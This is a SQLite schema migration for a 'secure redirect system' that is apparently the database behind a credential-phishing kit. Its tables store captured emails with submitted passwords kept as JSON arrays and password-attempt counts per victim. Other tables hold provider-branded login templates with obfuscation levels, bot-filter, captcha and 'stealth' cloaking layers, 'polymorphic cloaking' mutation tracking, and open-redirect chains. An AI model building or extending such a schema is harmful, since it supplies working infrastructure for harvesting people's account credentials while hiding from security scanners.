-- ============================================
-- FOX SECURE REDIRECT SYSTEM
-- SQLite Schema Initialization
-- ============================================
-- 
-- Phase 1: Schema creation only
-- DO NOT run this migration until approved
-- 
-- This file contains all tables exactly as documented in:
-- PROJECT_ARCHITECTURE/04_DATABASE_API_FOUNDATION.md
-- 
-- ============================================

-- Enable foreign keys
PRAGMA foreign_keys = ON;

-- Enable WAL mode for better concurrency
PRAGMA journal_mode = WAL;

-- ============================================
-- 1. ADMIN SETTINGS
-- ============================================
CREATE TABLE IF NOT EXISTS admin_settings (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    notifications TEXT NOT NULL,  -- JSON
    security TEXT NOT NULL,        -- JSON
    filtering TEXT NOT NULL,        -- JSON
    templates TEXT NOT NULL,       -- JSON
    redirects TEXT NOT NULL,       -- JSON
    updated_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);

-- Insert default row (id=1) if it doesn't exist
INSERT OR IGNORE INTO admin_settings (id, notifications, security, filtering, templates, redirects)
VALUES (1, '{}', '{}', '{}', '{}', '{}');

-- ============================================
-- 2. LINKS (Core link records)
-- ============================================
CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    type TEXT NOT NULL CHECK (type IN ('personalized', 'generic')),
    session_identifier TEXT UNIQUE NOT NULL,
    link_token TEXT,  -- Legacy alias for backward compatibility
    name TEXT,
    email TEXT,
    status TEXT NOT NULL CHECK (status IN ('active', 'used', 'expired', 'deleted')),
    template_id TEXT,
    template_mode TEXT CHECK (template_mode IN ('auto', 'manual', 'rotate')),
    language TEXT,
    loading_screen TEXT,
    loading_duration INTEGER,
    created_at INTEGER NOT NULL,
    expires_at INTEGER NOT NULL,
    used INTEGER NOT NULL DEFAULT 0 CHECK (used IN (0, 1)),
    used_at INTEGER,
    fingerprint TEXT,
    ip TEXT,
    total_emails INTEGER,
    captured_count INTEGER DEFAULT 0,
    pending_count INTEGER,
    link_format TEXT NOT NULL DEFAULT 'C' CHECK (link_format IN ('A', 'B', 'C'))
);

-- Indexes for links
CREATE UNIQUE INDEX IF NOT EXISTS idx_links_session_identifier ON links(session_identifier);
CREATE INDEX IF NOT EXISTS idx_links_type ON links(type);
CREATE INDEX IF NOT EXISTS idx_links_status ON links(status);
CREATE INDEX IF NOT EXISTS idx_links_expires_at ON links(expires_at);

-- ============================================
-- 3. EMAIL ALLOWLISTS (Type B link email lists)
-- ============================================
CREATE TABLE IF NOT EXISTS email_allowlists (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT NOT NULL,
    email TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    captured INTEGER NOT NULL DEFAULT 0 CHECK (captured IN (0, 1)),
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
);

-- Indexes for email_allowlists
CREATE INDEX IF NOT EXISTS idx_email_allowlists_link_id ON email_allowlists(link_id);
CREATE INDEX IF NOT EXISTS idx_email_allowlists_email ON email_allowlists(email);

-- ============================================
-- 4. OPEN REDIRECTS (Redirect destinations per link)
-- ============================================
CREATE TABLE IF NOT EXISTS open_redirects (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT NOT NULL,
    target_url TEXT NOT NULL,
    encode INTEGER NOT NULL DEFAULT 0 CHECK (encode IN (0, 1)),
    type TEXT,
    subdomain TEXT,
    created_at INTEGER NOT NULL,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
);

-- Index for open_redirects
CREATE INDEX IF NOT EXISTS idx_open_redirects_link_id ON open_redirects(link_id);

-- ============================================
-- 5. CAPTURED EMAILS (Mirrors .sessions.json)
-- ============================================
CREATE TABLE IF NOT EXISTS captured_emails (
    id TEXT PRIMARY KEY,
    link_id TEXT,
    email TEXT NOT NULL,
    fingerprint TEXT NOT NULL,
    ip TEXT NOT NULL,
    passwords TEXT NOT NULL,  -- JSON array
    verified INTEGER NOT NULL DEFAULT 0 CHECK (verified IN (0, 1)),
    provider TEXT,
    captured_at INTEGER NOT NULL,
    attempts INTEGER NOT NULL DEFAULT 0,
    mx_record TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
);

-- Indexes for captured_emails
CREATE INDEX IF NOT EXISTS idx_captured_emails_link_id ON captured_emails(link_id);
CREATE INDEX IF NOT EXISTS idx_captured_emails_email ON captured_emails(email);
CREATE INDEX IF NOT EXISTS idx_captured_emails_captured_at ON captured_emails(captured_at);

-- ============================================
-- 6. EMAIL ID MAPPINGS (Type A link email resolution)
-- ============================================
CREATE TABLE IF NOT EXISTS email_id_mappings (
    id TEXT PRIMARY KEY,
    email TEXT NOT NULL,
    link_id TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
);

-- ============================================
-- 7. CONSUMED TOKENS (One-time-use token tracking for v3)
-- ============================================
CREATE TABLE IF NOT EXISTS consumed_tokens (
    token_hash TEXT PRIMARY KEY,  -- SHA-256 hash of the token
    link_id TEXT NOT NULL,
    consumed_at INTEGER NOT NULL,
    ip TEXT,
    user_agent TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE CASCADE
);

-- Index for consumed_tokens
CREATE INDEX IF NOT EXISTS idx_consumed_tokens_link_id ON consumed_tokens(link_id);
CREATE INDEX IF NOT EXISTS idx_consumed_tokens_consumed_at ON consumed_tokens(consumed_at);

-- ============================================
-- 8. SESSIONS (One-time download sessions)
-- ============================================
CREATE TABLE IF NOT EXISTS sessions (
    session_id TEXT PRIMARY KEY,
    email TEXT NOT NULL,
    ip_hash TEXT NOT NULL,
    ua_hash TEXT NOT NULL,
    created_at INTEGER NOT NULL,
    verified INTEGER NOT NULL DEFAULT 1 CHECK (verified IN (0, 1))
);

-- ============================================
-- 9. AUTH ATTEMPTS (4-attempt rule tracking)
-- ============================================
CREATE TABLE IF NOT EXISTS auth_attempts (
    id TEXT PRIMARY KEY,  -- Format: ${email}_${date}
    count INTEGER NOT NULL DEFAULT 0,
    passwords TEXT NOT NULL,  -- JSON array
    updated_at INTEGER NOT NULL
);

-- ============================================
-- 10. FINGERPRINTS (Device/IP deduplication)
-- ============================================
CREATE TABLE IF NOT EXISTS fingerprints (
    id TEXT PRIMARY KEY,  -- Generated from (email, fingerprint, ip)
    email TEXT NOT NULL,
    fingerprint TEXT NOT NULL,
    ip TEXT NOT NULL,
    link_id TEXT,
    created_at INTEGER NOT NULL,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL,
    UNIQUE(email, fingerprint, ip)
);

-- ============================================
-- 11. VISITOR LOGS (Analytics backing store)
-- ============================================
CREATE TABLE IF NOT EXISTS visitor_logs (
    id TEXT PRIMARY KEY,
    timestamp INTEGER NOT NULL,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    country TEXT,
    city TEXT,
    captcha_status TEXT CHECK (captcha_status IN ('verified', 'failed', 'pending')),
    bot_status TEXT CHECK (bot_status IN ('human', 'bot', 'suspicious')),
    fingerprint TEXT,
    link_id TEXT,
    email TEXT,
    layer TEXT CHECK (layer IN ('bot-filter', 'captcha', 'bot-delay', 'stealth', 'login', 'middleware')),
    layer_passed INTEGER NOT NULL DEFAULT 0 CHECK (layer_passed IN (0, 1)),
    session_id TEXT,
    reason TEXT,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
);

-- Indexes for visitor_logs
CREATE INDEX IF NOT EXISTS idx_visitor_logs_timestamp ON visitor_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_visitor_logs_country ON visitor_logs(country);
CREATE INDEX IF NOT EXISTS idx_visitor_logs_bot_status ON visitor_logs(bot_status);
CREATE INDEX IF NOT EXISTS idx_visitor_logs_layer ON visitor_logs(layer);

-- ============================================
-- 11. SECURITY EVENTS (Security monitoring)
-- ============================================
CREATE TABLE IF NOT EXISTS security_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT NOT NULL,
    severity TEXT NOT NULL CHECK (severity IN ('low', 'medium', 'high', 'critical')),
    ip TEXT,
    fingerprint TEXT,
    user_agent TEXT,
    details TEXT NOT NULL,  -- JSON
    timestamp INTEGER NOT NULL
);

-- Indexes for security_events
CREATE INDEX IF NOT EXISTS idx_security_events_timestamp ON security_events(timestamp);
CREATE INDEX IF NOT EXISTS idx_security_events_type ON security_events(type);

-- ============================================
-- 12. TEMPLATES (Replaces .templates/templates.json)
-- ============================================
CREATE TABLE IF NOT EXISTS templates (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    provider TEXT NOT NULL,
    type TEXT NOT NULL,
    theme TEXT NOT NULL,           -- JSON
    background TEXT NOT NULL,      -- JSON
    logo TEXT NOT NULL,            -- JSON
    layout TEXT NOT NULL,          -- JSON
    translations TEXT NOT NULL,   -- JSON
    default_language TEXT,
    auto_detect_language INTEGER NOT NULL DEFAULT 0 CHECK (auto_detect_language IN (0, 1)),
    features TEXT NOT NULL,        -- JSON
    obfuscation_level TEXT,
    enabled INTEGER NOT NULL DEFAULT 1 CHECK (enabled IN (0, 1)),
    is_default INTEGER NOT NULL DEFAULT 0 CHECK (is_default IN (0, 1)),
    created_at INTEGER NOT NULL,
    updated_at INTEGER NOT NULL,
    created_by TEXT
);

-- Indexes for templates
CREATE INDEX IF NOT EXISTS idx_templates_enabled ON templates(enabled);
CREATE INDEX IF NOT EXISTS idx_templates_provider ON templates(provider);

-- ============================================
-- 13. FILE UPLOADS (Upload metadata tracking)
-- ============================================
CREATE TABLE IF NOT EXISTS file_uploads (
    id TEXT PRIMARY KEY,
    link_id TEXT,
    filename TEXT NOT NULL,
    mime_type TEXT,
    size INTEGER,
    storage_path TEXT,
    checksum TEXT,
    created_at INTEGER NOT NULL,
    FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
);

-- Index for file_uploads
CREATE INDEX IF NOT EXISTS idx_file_uploads_link_id ON file_uploads(link_id);

-- ============================================
-- 14. MUTATIONS (Phase 5.8: Polymorphic cloaking tracking)
-- ============================================
CREATE TABLE IF NOT EXISTS mutations (
    id TEXT PRIMARY KEY,
    user_agent TEXT,
    ip TEXT,
    mutation_key TEXT UNIQUE NOT NULL,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
    last_used_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);

-- Indexes for mutations
CREATE INDEX IF NOT EXISTS idx_mutations_ip_ua ON mutations(ip, user_agent);
CREATE INDEX IF NOT EXISTS idx_mutations_key ON mutations(mutation_key);
CREATE INDEX IF NOT EXISTS idx_mutations_created ON mutations(created_at);

-- ============================================
-- 15. BEHAVIORAL EVENTS (Phase 5.9: Behavioral security tracking)
-- ============================================
CREATE TABLE IF NOT EXISTS behavioral_events (
    id TEXT PRIMARY KEY,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    event_type TEXT NOT NULL,
    score INTEGER NOT NULL,
    meta TEXT,
    created_at INTEGER NOT NULL DEFAULT (strftime('%s', 'now'))
);

-- Indexes for behavioral_events
CREATE INDEX IF NOT EXISTS idx_behavior_ip_ua ON behavioral_events(ip, user_agent);
CREATE INDEX IF NOT EXISTS idx_behavior_created ON behavioral_events(created_at);

-- ============================================
-- 16. CAPTCHA SESSIONS (PATCH 1: Server-side CAPTCHA session tracking)
-- ============================================
CREATE TABLE IF NOT EXISTS captcha_sessions (
    sessionId TEXT PRIMARY KEY,
    ip TEXT NOT NULL,
    userAgent TEXT NOT NULL,
    verifiedAt INTEGER NOT NULL DEFAULT (strftime('%s', 'now')),
    expiresAt INTEGER NOT NULL DEFAULT (strftime('%s', 'now', '+1 hour'))
);

-- Indexes for captcha_sessions
CREATE INDEX IF NOT EXISTS idx_captcha_sessions_ip_ua ON captcha_sessions(ip, userAgent);
CREATE INDEX IF NOT EXISTS idx_captcha_sessions_expires ON captcha_sessions(expiresAt);

-- ============================================
-- END OF SCHEMA
-- ============================================
-- 
-- To apply this migration:
--   1. Review the schema above
--   2. Ensure lib/db.ts is in place
--   3. Run: sqlite3 data/fox_secure.db < migrations/init.sql
--   4. Verify tables with: .tables
--   5. Verify indexes with: .indexes
-- 
-- ============================================

